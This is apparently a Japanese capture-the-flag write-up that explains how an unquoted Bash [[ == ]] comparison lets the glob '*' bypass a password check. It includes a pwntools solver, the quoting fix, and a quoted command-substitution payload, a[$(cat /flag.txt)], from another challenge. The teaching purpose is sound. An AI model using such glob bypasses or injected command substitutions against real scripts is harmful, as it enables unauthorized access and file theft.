# Password, Please

## 問題

Bashで初めてのパスワードチェッカーを書きました。ログインしてください。

```bash
secret="${RANDOM}${RANDOM}${RANDOM}${RANDOM}"

printf 'Password: '
read -r password

if [[ $secret == $password ]]; then
    cat /flag.txt
else
    echo 'Access denied'
fi
```

## 概要

実行するとパスワードの入力を求められ、それがランダムに生成された`secret`と一致していたらフラグを獲得できるようです。

Bashの`RANDOM`は0～32767の範囲の乱数を返し、さらにそれが4つもあるので、あてずっぽうで当てにいくのは無理があります。

どうすればフラグを得ることができるのでしょうか？

## 方針

Bashの特殊な比較方法を利用する。

## 解法

Bashの`[[ ... == ... ]]`の比較は、右辺がダブルクオートで囲まれていない場合、パターンとして比較されるようです。

このパターンにはワイルドカードとして`?`（任意の1文字）や`*`（任意の文字列）が使えます。

よって、
```
Password: *
```
を入力すれば、フラグを取得することができます。

```py
import pwn

HOST, PORT = "localhost", 1337
# HOST, PORT =  "34.170.146.252", 37280
p = pwn.remote(HOST, PORT)

p.sendlineafter(b"Password: ", b"*")
print(p.recvline().decode())
```
```
Alpaca{REDACTED}
```

なお、このような攻撃を防ぐには、
```bash
if [[ $secret == "$password" ]]; then
```
のように右辺をダブルクオートで囲めばOKです。

## 補足

今回の問題を見て、5月5日の過去問「do the math」を思い出したのは私だけではないはずです。

<details>
<summary>do the mathのネタバレあり</summary>
```
Password: a[$(cat /flag.txt)]
Access denied
```
</details>

しかし、`==`と`-Eq`では評価の方法が違うのか、今回の問題では同じ方法は使えませんでした。
